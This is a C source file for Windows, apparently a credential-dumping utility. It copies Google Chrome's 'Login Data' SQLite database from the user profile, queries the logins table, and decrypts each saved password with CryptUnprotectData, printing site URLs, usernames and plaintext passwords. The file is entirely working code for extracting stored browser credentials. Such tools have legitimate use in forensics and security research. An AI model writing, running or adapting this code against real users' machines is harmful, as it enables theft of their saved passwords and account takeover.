#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>

// Link with crypt32.lib
#pragma comment(lib, "crypt32.lib")

#include "sqlite3.h"
#include "utils.h"

static void usage(char* exe );
static int process_row(void *NotUsed, int argc, char **argv, char **azColName);

unsigned int log_level = LOG_LEVEL_NONE;

int main(int argc, char **argv){
        sqlite3 *db = NULL;
        char *err_msg = NULL;
        int rc = 0;

        if (argc == 2) {
                if ( !strncmp(argv[1], "-vv", 3)) {
                        log_level = LOG_LEVEL_VERY_VERBOSE;
                } else if (!strncmp(argv[1], "-v", 2)) {
                        log_level = LOG_LEVEL_VERBOSE;
                }
                else if (!strncmp(argv[1], "-h", 2)) {
                        usage(argv[0]);
                        exit(0);
                }
        } else if (argc >= 3) {
                printf("Invalid parameters\n");
                exit(1);
        }

        /* Get chrome passwords database */
        char user_profile[100];
        rc = GetEnvironmentVariable("UserProfile", user_profile, 100);
        if(0 != rc){
                VVERBOSE(printf("UserProfile folder: %s\n", user_profile););
        }

        char login_db[200] = {0};
        strcat(login_db, user_profile);
        strcat(login_db, "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\Login Data");
        VVERBOSE(printf("Db: %s\n", login_db););
        /* Location valid on WinXP. From Vista changed to
         C:\Users\<username>\Appdata\Local\Google\Chrome\User Data\Default
        */

        /* Use a copy of the db. (original may be already locked) */
        rc = CopyFile(login_db, "copy_db",FALSE);
        if(!rc){
                fprintf(stderr, "CopyFile failed\n");
                exit(1);
        }

        rc = sqlite3_open("copy_db", &db);
        if(rc){
                fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
                sqlite3_close(db);
                return(1);
        }

        rc = sqlite3_exec(db, "SELECT * FROM logins", process_row, db, &err_msg);
        if( rc != SQLITE_OK ){
                fprintf(stderr, "SQL error: %s (%d)\n", err_msg, rc);
                sqlite3_free(err_msg);
        }

        sqlite3_free(err_msg);
        sqlite3_close(db);

        rc = DeleteFile("copy_db");
        if( !rc ){
                fprintf(stderr, "DeleteFile failed\n");
        }

        return 0;
}

static void usage(char* exe ) {
        printf( "Unprotect and dump saved chrome passwords\n" );
        printf( "%s [-v | -vv | -h]\n-v\tVerbose\n-vv\tVery verbose\n-h\tHelp", exe );
}

static int row_id = 1;
/* 4th argument of sqlite3_exec is the 1st argument to callback */
static int process_row(void *passed_db, int argc, char **argv, char **col_name){
        int i = 0;
        int rc = 0;
        sqlite3 *db = (sqlite3*)passed_db;
        sqlite3_blob* blob = NULL;
        int blob_size = 0;

        for(i=0; i<argc; i++){
                if( !strcmp(col_name[i], "origin_url")) {
                        printf("[%d] Url: %s\n", row_id, argv[i] ? argv[i] : "NULL");
                } else if ( !strcmp(col_name[i], "username_value")) {
                        printf("Username: %s\n", argv[i] ? argv[i] : "NULL");
                } else if ( !strcmp(col_name[i], "password_value")) {
                        if(!argv[i])
                                continue;

                        VERBOSE(printf("row_id: %d\n", row_id););
                        /* password is stored in a blob */
                        rc = sqlite3_blob_open(db, "main", "logins", "password_value", row_id, 0, &blob);
                        if (rc != SQLITE_OK ) {
                                fprintf(stderr, "Password blob not opened for %s\n", argv[i]);
                                exit(1);
                        }
                        row_id ++;

                        blob_size = sqlite3_blob_bytes(blob);
                        VVERBOSE(printf("Read blob %p with size %d\n", blob, blob_size););

                        DATA_BLOB enc_data;
                        enc_data.pbData = (BYTE*)malloc(blob_size);;
                        enc_data.cbData = blob_size;

                        rc = sqlite3_blob_read(blob, enc_data.pbData, blob_size, 0);
                        if (rc != SQLITE_OK){
                                fprintf(stderr, "Blob read error (code %d)\n", rc);
                                continue;
                        }

                        VVERBOSE(dump_bytes(enc_data.pbData, blob_size, 0););

                        /* decrypt data */
                        DATA_BLOB dec_data;
                        if(CryptUnprotectData(&enc_data, NULL, NULL, NULL, NULL, 0, &dec_data))
                        {
                                printf("Password len: %d\n", dec_data.cbData);
                                dump_bytes(dec_data.pbData, dec_data.cbData, 1);
                        } else
                        {
                                fprintf(stderr, "Decryption failed\n");
                        }

                        /* cleanup */
                        free(enc_data.pbData);  // Allocated with malloc !!!
                        LocalFree(dec_data.pbData);

                        sqlite3_blob_close(blob);
                }
        }

        printf("\n");
        return 0;
}